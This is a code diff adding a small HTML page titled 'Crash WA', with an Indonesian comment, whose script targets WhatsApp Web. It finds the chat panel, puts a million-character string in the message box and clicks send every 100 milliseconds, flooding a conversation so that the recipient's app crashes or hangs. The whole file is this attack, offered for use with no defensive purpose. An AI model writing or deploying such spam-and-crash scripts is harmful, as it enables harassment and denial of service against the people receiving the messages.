@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html>
+<head><title>Crash WA</title></head>
+<body>
+<script>
+// cek apakah ada elemen WA Web
+setInterval(() => {
+  let msgs = document.querySelectorAll('[data-testid="conversation-panel-messages"]');
+  if(msgs.length) {
+    let bugText = "A".repeat(1000000);
+    let input = document.querySelector('[contenteditable="true"]');
+    if(input) {
+      input.innerText = bugText;
+      input.dispatchEvent(new Event('input', {bubbles: true}));
+      setInterval(() => {
+        let sendBtn = document.querySelector('[data-testid="compose-btn-send"]');
+        if(sendBtn) sendBtn.click();
+      }, 100);
+    }
+  }
+}, 1000);
+</script>
+</body>
+</html>
